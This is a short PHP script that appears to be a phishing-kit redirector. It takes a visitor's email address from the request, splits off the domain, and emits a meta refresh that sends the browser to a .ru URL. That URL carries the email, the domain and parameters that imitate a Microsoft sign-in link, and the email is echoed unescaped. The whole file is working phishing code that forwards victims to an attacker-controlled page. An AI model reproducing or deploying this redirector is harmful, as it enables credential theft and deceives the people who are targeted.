<?php


$user = isset($_REQUEST['email']) ? $_REQUEST['email'] : $_REQUEST['e'];
$domain = strpos($user, '@');
$nto = substr($user,$domain);
$domains = substr($nto,1);
$email = $user;
//echo "?email=$email&domain=".$domains."&log=0&3vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1'";
echo "<meta http-equiv=refresh content=0;url='http://permparasport.ru/language/overrides/index.php?email=$email&domain=".$domains."&log=0&3vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1' >";


?>